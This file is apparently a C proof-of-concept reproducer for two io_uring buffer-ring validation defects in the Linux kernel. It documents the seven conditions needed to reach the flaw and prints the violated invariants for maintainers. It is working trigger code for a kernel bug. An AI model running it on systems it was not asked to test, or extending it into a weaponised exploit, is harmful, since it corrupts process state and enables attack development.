// SPDX-License-Identifier: GPL-2.0
/*
 * poc_kbuf_triage.c — triage reproducer for io_uring/kbuf.c findings.
 *
 * Target file : io_uring/kbuf.c -> io_ring_buffers_peek()
 * Findings    : [2] UNVALIDATED_TAIL_DELTA   (mode: tail-delta, default)
 *               [8] ZERO_LEN_BUFFER_IN_LOOP  (mode: zero-len)
 *
 * Requires    : Linux >= 6.10 (IORING_RECVSEND_BUNDLE), liburing >= 2.7
 * Build       : gcc -O2 -Wall -o poc_kbuf_triage poc_kbuf_triage.c -luring
 * Run         : ./poc_kbuf_triage [tail-delta|zero-len] [sqe_len_override]
 *
 * ---------------------------------------------------------------------------
 * WHAT THIS IS AND WHAT IT IS NOT
 * ---------------------------------------------------------------------------
 * This is a VALIDATION HARNESS, not a weaponised exploit. It demonstrates a
 * kernel-side input-validation defect and prints the violated invariant so a
 * maintainer can reproduce it from a bug report.
 *
 * Blast radius is the calling process only:
 *   - every address read from the ring passes access_ok() before use, so no
 *     kernel address can ever become an I/O target;
 *   - every slot index is computed as (head & bl->mask), so no access can
 *     leave the mapped ring region.
 * The consequence is buffer-accounting corruption and silent overwrite of the
 * caller's OWN buffers. No kernel memory is corrupted, no privilege boundary
 * is crossed. See TRIAGE.md for why that classification matters for routing
 * the report.
 *
 * ---------------------------------------------------------------------------
 * THE REACHABILITY CHAIN (read this before "fixing" the parameters)
 * ---------------------------------------------------------------------------
 * The vulnerable function io_ring_buffers_peek() is reached only via
 * io_buffers_peek(), and only if every link below holds:
 *
 *   1. io_recv():            io_do_buffer_select(req)          -> IOSQE_BUFFER_SELECT
 *   2. io_recv():            sel.val = sr->len                 -> sqe->len MUST be != 0
 *   3. io_recv_buf_select(): !(issue_flags & IO_URING_F_UNLOCKED)
 *                            -> data must already be queued so the request is
 *                               issued inline and never punted to io-wq
 *   4. io_recv_buf_select(): sr->flags & IORING_RECVSEND_BUNDLE
 *                            -> sqe->ioprio = IORING_RECVSEND_BUNDLE
 *   5. io_recv_buf_select(): arg.max_len = sel->val != 0
 *   6. io_ring_buffers_peek(): KBUF_MODE_EXPAND && nr_avail > nr_iovs
 *                            && arg->max_len
 *                            -> EXPANSION must fire, otherwise nr_iovs stays 1
 *                               and the do/while runs a single iteration
 *   7. io_ring_buffers_peek(): needed = (max_len + bufs[head].len - 1)
 *                                       / bufs[head].len
 *                            -> nr_avail is clamped to `needed`, so max_len
 *                               must be large relative to buf_len
 *
 * Link 2 is the one that silently kills naive reproducers: with sqe->len == 0
 * the kernel takes arg.max_len == 0, skips the EXPAND branch, builds exactly
 * one iovec and the bug is never exercised. That is why this harness passes
 * sqe->len explicitly.
 */
#define _GNU_SOURCE
#include <errno.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <linux/io_uring.h>
#include <liburing.h>

/*
 * IORING_RECVSEND_BUNDLE is a real macro, so #ifndef works. Value verified
 * against include/uapi/linux/io_uring.h for v6.10..v6.15: (1U << 4).
 */
#ifndef IORING_RECVSEND_BUNDLE
#define IORING_RECVSEND_BUNDLE		(1U << 4)
#endif

/*
 * ---------------------------------------------------------------------
 * IORING_REGISTER_PBUF_STATUS (opcode + struct io_uring_buf_status, v6.8)
 * ---------------------------------------------------------------------
 * The opcode is an ENUMERATOR inside an anonymous enum, NOT a macro. The C
 * preprocessor never sees enumerators, so "#ifndef IORING_REGISTER_PBUF_STATUS"
 * is unconditionally true -- on every header, old and new. An earlier revision
 * of this file used exactly that guard around a fallback struct definition and
 * a fallback #define; on any distro shipping post-6.8 uapi headers it failed
 * with "error: redefinition of 'struct io_uring_buf_status'" (and the #define
 * would have collided with the enumerator next).
 *
 * Lesson recorded in TRIAGE.md 2.3: never feature-test an enum constant with
 * #ifndef. Two consequences for the design below:
 *
 *   1. We declare our OWN struct (poc_buf_status) with the stable uapi layout
 *      instead of touching the header's name. Our name cannot collide.
 *      Layout verified against io_uring_register(2):
 *          __u32 buf_group;   (input)
 *          __u32 head;        (output)
 *          __u32 resv[3];
 *
 *   2. The opcode is injected by the build (-DPOC_PBUF_STATUS_OP=N) after a
 *      compile-time probe that reads the value out of the installed header.
 *      No number is hardcoded here, so nothing can drift. When the probe
 *      finds no support, query_head() compiles to a stub and the verdict falls
 *      back to the res-vs-capacity invariant, which needs no register call.
 */
struct poc_buf_status {
	__u32	buf_group;	/* in:  buffer group id */
	__u32	head;		/* out: kernel-side bl->head */
	__u32	resv[3];
};

#define BGID		1u
#define RING_ENTRIES	2u	/* power of two; real capacity = 2 slots */
#define BUF_LEN		64u	/* bytes per legitimately published buffer */
#define TAIL_DELTA	100u	/* bogus tail: 50x the real capacity */

static void die(const char *what)
{
	fprintf(stderr, "[-] %s: %s\n", what, strerror(errno));
	exit(1);
}

static void *xzalloc(size_t n)
{
	void *p = calloc(1, n);

	if (!p)
		die("calloc");
	return p;
}

/*
 * Secondary observation: ask the kernel what bl->head became.
 * Returns -1 when the opcode was not supplied by the build probe, in which
 * case the caller reports "head unavailable" and relies on the primary
 * res-vs-capacity invariant.
 */
static int query_head(int ring_fd, unsigned int bgid, unsigned int *head)
{
#ifdef POC_PBUF_STATUS_OP
	struct poc_buf_status st;

	memset(&st, 0, sizeof(st));
	st.buf_group = bgid;

	if (io_uring_register(ring_fd, POC_PBUF_STATUS_OP, &st, 1))
		return -1;

	*head = st.head;
	return 0;
#else
	(void)ring_fd;
	(void)bgid;
	(void)head;
	return -1;
#endif
}

int main(int argc, char *argv[])
{
	const char *mode = (argc > 1) ? argv[1] : "tail-delta";
	struct io_uring ring;
	struct io_uring_buf_reg reg;
	struct io_uring_buf_ring *br;
	struct io_uring_sqe *sqe;
	struct io_uring_cqe *cqe;
	char *real_buf[RING_ENTRIES];
	char *payload;
	size_t payload_len, capacity, sqe_len;
	unsigned int tail_to_publish, i, head;
	long page = sysconf(_SC_PAGESIZE);
	int zero_len_mode, head_ok, sp[2], ret;

	if (strcmp(mode, "tail-delta") && strcmp(mode, "zero-len")) {
		fprintf(stderr, "usage: %s [tail-delta|zero-len] [sqe_len]\n",
			argv[0]);
		return 2;
	}
	zero_len_mode = !strcmp(mode, "zero-len");
	head = 0;

	capacity = (size_t)RING_ENTRIES * BUF_LEN;

	/*
	 * tail-delta: ask for far more than the ring can legitimately supply.
	 *   max_len = 6400, buf_len = 64 -> needed = 100, nr_avail = 100,
	 *   so 100 iovecs get mapped onto 2 physical slots.
	 * zero-len: 2 * BUF_LEN is the smallest max_len that still makes
	 *   needed = 2, which is what forces nr_avail(2) > nr_iovs(1) and
	 *   therefore fires the EXPAND branch. Do not lower it.
	 */
	payload_len = zero_len_mode ? (size_t)2 * BUF_LEN
				    : (size_t)TAIL_DELTA * BUF_LEN;
	sqe_len = (argc > 2) ? (size_t)strtoul(argv[2], NULL, 0) : payload_len;

	printf("=== io_uring/kbuf.c triage reproducer ===\n");
	printf("[*] mode          : %s\n", mode);
	printf("[*] ring_entries  : %u (real capacity = %zu bytes)\n",
	       RING_ENTRIES, capacity);
	printf("[*] buf_len       : %u bytes\n", BUF_LEN);
	printf("[*] sqe->len      : %zu  (drives sel.val -> arg.max_len)\n",
	       sqe_len);

	/* [1] Stream socketpair with data already queued -> inline issue. */
	if (socketpair(AF_UNIX, SOCK_STREAM, 0, sp))
		die("socketpair");

	payload = xzalloc(payload_len);
	memset(payload, 0x55, payload_len);

	if (write(sp[0], payload, payload_len) != (ssize_t)payload_len)
		die("write(payload)");
	printf("[*] queued        : %zu bytes on the socket\n", payload_len);

	/* [2] io_uring instance. */
	ret = io_uring_queue_init(8, &ring, 0);
	if (ret) {
		errno = -ret;
		die("io_uring_queue_init");
	}

	/*
	 * [3] Provided-buffer ring backed by OUR OWN page: the supported
	 *     IORING_MEM_REGION_TYPE_USER mode. This is exactly why br->tail
	 *     is user-writable at any instant and must never be trusted.
	 */
	br = mmap(NULL, page, PROT_READ | PROT_WRITE,
		  MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	if (br == MAP_FAILED)
		die("mmap(ring)");

	memset(&reg, 0, sizeof(reg));
	reg.ring_addr = (unsigned long)br;
	reg.ring_entries = RING_ENTRIES;
	reg.bgid = BGID;

	ret = io_uring_register_buf_ring(&ring, &reg, 0);
	if (ret) {
		fprintf(stderr,
			"[-] io_uring_register_buf_ring failed (%d): kernel too "
			"old, or CONFIG_IO_URING disabled, or io_uring "
			"restricted (check sysctl kernel.io_uring_disabled).\n",
			ret);
		return 1;
	}
	io_uring_buf_ring_init(br);
	printf("[*] pbuf ring     : registered, bgid=%u, br=%p\n", BGID,
	       (void *)br);

	/*
	 * [4] Publish RING_ENTRIES legitimate buffers. Each is pre-filled
	 *     with a 0xAA sentinel so an overwrite is visible.
	 *     zero-len mode leaves bufs[1..].len == 0.
	 */
	for (i = 0; i < RING_ENTRIES; i++) {
		real_buf[i] = xzalloc(BUF_LEN);
		memset(real_buf[i], 0xAA, BUF_LEN);

		br->bufs[i].addr = (unsigned long)real_buf[i];
		br->bufs[i].bid = i;
		br->bufs[i].len = (zero_len_mode && i > 0) ? 0 : BUF_LEN;
	}

	/*
	 * [5] The trigger.
	 *
	 * tail-delta: publish tail = TAIL_DELTA although only RING_ENTRIES
	 *             buffers exist. bl->head is 0, so the kernel computes
	 *             nr_avail = min_t(__u16, tail - head, UIO_MAXIOV) = 100
	 *             and maps 100 iovecs onto 2 physical slots.
	 * zero-len  : publish an honest tail, but leave bufs[1].len == 0. The
	 *             pre-loop check rejects only a zero-length FIRST buffer;
	 *             deeper zero-length buffers are appended as iov_len == 0
	 *             and still consume a head slot.
	 */
	tail_to_publish = zero_len_mode ? RING_ENTRIES : TAIL_DELTA;
	__atomic_store_n(&br->tail, (__u16)tail_to_publish, __ATOMIC_RELEASE);
	printf("[*] published     : tail=%u, head=0 -> kernel believes %u "
	       "buffers are available\n", tail_to_publish, tail_to_publish);
	printf("[*] legitimate    : %u buffers, %zu bytes of distinct "
	       "capacity\n", RING_ENTRIES, capacity);

	/* [6] Bundled recv with buffer selection. */
	sqe = io_uring_get_sqe(&ring);
	if (!sqe)
		die("io_uring_get_sqe");

	io_uring_prep_recv(sqe, sp[1], NULL, sqe_len, 0);
	sqe->flags |= IOSQE_BUFFER_SELECT;
	sqe->buf_group = BGID;
	sqe->ioprio = IORING_RECVSEND_BUNDLE;

	ret = io_uring_submit(&ring);
	if (ret < 0) {
		errno = -ret;
		die("io_uring_submit");
	}

	ret = io_uring_wait_cqe(&ring, &cqe);
	if (ret) {
		errno = -ret;
		die("io_uring_wait_cqe");
	}

	printf("[*] CQE           : res=%d flags=0x%x buf_id=%u\n",
	       cqe->res, cqe->flags, cqe->flags >> IORING_CQE_BUFFER_SHIFT);
	io_uring_cqe_seen(&ring, cqe);

	/* [7] Verdict. */
	printf("\n--- verdict ---\n");

	if (cqe->res < 0) {
		printf("[?] request failed: %d (%s)\n", cqe->res,
		       strerror(-cqe->res));
		printf("    Either fixed on this kernel, or the peek path was "
		       "not taken.\n    Walk the 7-link chain in the header "
		       "comment; the usual culprits are\n    sqe->len == 0 "
		       "(link 2) and the request being punted to io-wq "
		       "(link 3).\n");
		return 3;
	}

	head_ok = !query_head(ring.ring_fd, BGID, &head);
	if (head_ok)
		printf("[*] kernel bl->head after completion: %u\n", head);
	else
		printf("[*] bl->head unavailable "
		       "(IORING_REGISTER_PBUF_STATUS opcode mismatch)\n");

	if (zero_len_mode) {
		/*
		 * Honest expectation: bufs[1] carried zero bytes, so it must
		 * not be consumed. head should advance by 1, not 2.
		 */
		if (head_ok && head > 1) {
			printf("[!] VULNERABLE: %u ring slots consumed while "
			       "only bufs[0] carried data.\n", head);
			printf("    %u published buffer(s) were discarded with "
			       "zero bytes transferred.\n", head - 1);
			printf("    Root cause: io_ring_buffers_peek() checks "
			       "!len only for the FIRST\n    buffer (before the "
			       "loop); zero-length buffers deeper in the ring "
			       "are\n    appended as iov_len == 0 and still "
			       "count toward bl->head += nr.\n");
			return 0;
		}
		printf("[+] NOT reproduced (head=%u, head_ok=%d).\n", head,
		       head_ok);
		return head_ok ? 3 : 4;
	}

	/*
	 * The invariant a correct implementation must hold:
	 *   bytes transferred <= distinct buffer capacity offered by the ring
	 * Capacity here is RING_ENTRIES * BUF_LEN = 128 bytes. Anything more
	 * means the same physical slots were mapped repeatedly, i.e. the
	 * kernel trusted a user-supplied tail without validating it against
	 * bl->mask + 1.
	 */
	printf("[*] bytes transferred       : %d\n", cqe->res);
	printf("[*] distinct buffer capacity  : %zu\n", capacity);

	if ((size_t)cqe->res > capacity) {
		printf("\n[!] VULNERABLE - invariant violated.\n");
		printf("    The kernel moved %d bytes through a ring that only "
		       "ever offered %zu bytes of\n    distinct buffer space: "
		       "%zu bytes were written into slots that had already "
		       "been\n    filled. The same %u physical buffers were "
		       "mapped repeatedly and silently\n    overwritten.\n",
		       cqe->res, capacity, (size_t)cqe->res - capacity,
		       RING_ENTRIES);
		if (head_ok && head > RING_ENTRIES)
			printf("    bl->head advanced to %u in a %u-slot ring "
			       "-> permanent head/tail desync;\n    the buffer "
			       "group is now unusable.\n", head, RING_ENTRIES);
		printf("\n    Root cause, io_ring_buffers_peek():\n");
		printf("        tail = smp_load_acquire(&br->tail);   /* "
		       "user-writable */\n");
		printf("        nr_avail = min_t(__u16, tail - head, "
		       "UIO_MAXIOV);\n");
		printf("    with no check that (__u16)(tail - head) <= "
		       "bl->mask + 1.\n");
		printf("    min_t(__u16, ...) also turns a negative "
		       "(tail - head) into a large\n"
		       "    positive count, so head > tail reads as "
		       "\"almost full\".\n");
		return 0;
	}

	printf("\n[+] NOT reproduced: res=%d <= capacity=%zu.\n", cqe->res,
	       capacity);
	printf("    Either the kernel validates tail against ring capacity "
	       "(fixed), or\n    the multi-buffer peek path was not taken - "
	       "re-check link 2 (sqe->len)\n    and link 7 (max_len vs "
	       "buf_len ratio).\n");
	return 3;
}
